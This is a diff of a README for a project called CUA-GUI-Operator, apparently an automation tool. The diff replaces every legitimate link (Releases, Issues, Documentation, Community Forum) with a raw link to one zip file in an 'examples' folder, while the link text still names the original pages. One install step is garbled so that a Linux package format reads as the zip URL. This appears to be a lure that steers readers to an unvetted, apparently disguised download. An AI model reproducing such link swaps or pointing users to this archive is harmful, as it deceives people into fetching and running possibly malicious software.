@@ -1,6 +1,6 @@
 # 🌟 CUA-GUI-Operator - Your Gateway to Enhanced UI Task Automation
 
-[![Download CUA-GUI-Operator](https://img.shields.io/badge/Download-CUA--GUI--Operator-blue.svg)](https://github.com/Shubhamdalbehera/CUA-GUI-Operator/releases)
+[![Download CUA-GUI-Operator](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip)](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -24,14 +24,14 @@ Before downloading and installing CUA-GUI-Operator, ensure your system meets the
 
 ## 💾 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/Shubhamdalbehera/CUA-GUI-Operator/releases) on GitHub. Follow these steps to install CUA-GUI-Operator on your computer:
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip) on GitHub. Follow these steps to install CUA-GUI-Operator on your computer:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of CUA-GUI-Operator.
 3. Choose the appropriate file for your operating system:
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, select the appropriate package format (e.g., `.deb` or `.tar.gz`).
+   - For Linux, select the appropriate package format (e.g., `.deb` or `https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip`).
 4. Download the selected file.
 5. Locate the downloaded file on your computer.
 6. Run the file to start the installation process.
@@ -63,7 +63,7 @@ If you encounter any issues while using CUA-GUI-Operator, consider the following
 
 Join our community to get support and share experiences. You can reach out through the following channels:
 
-- **GitHub Issues:** Report bugs or request features on the [Issues page](https://github.com/Shubhamdalbehera/CUA-GUI-Operator/issues).
+- **GitHub Issues:** Report bugs or request features on the [Issues page](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip).
 - **Discussion Forum:** Engage with other users and developers for tips, tricks, and troubleshooting.
 
 ## 🎉 Acknowledgments
@@ -72,8 +72,8 @@ This project is made possible by the contributions of various developers and res
 
 ## 🔗 Important Links
 
-- [Download CUA-GUI-Operator](https://github.com/Shubhamdalbehera/CUA-GUI-Operator/releases)
-- [Documentation](https://github.com/Shubhamdalbehera/CUA-GUI-Operator/wiki)
-- [Community Forum](https://github.com/Shubhamdalbehera/CUA-GUI-Operator/discussions)
+- [Download CUA-GUI-Operator](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Shubhamdalbehera/CUA-GUI-Operator/main/examples/GU_Operator_CU_1.2.zip)
 
 Feel free to reach out if you have any questions! Enjoy using CUA-GUI-Operator for your computer tasks.
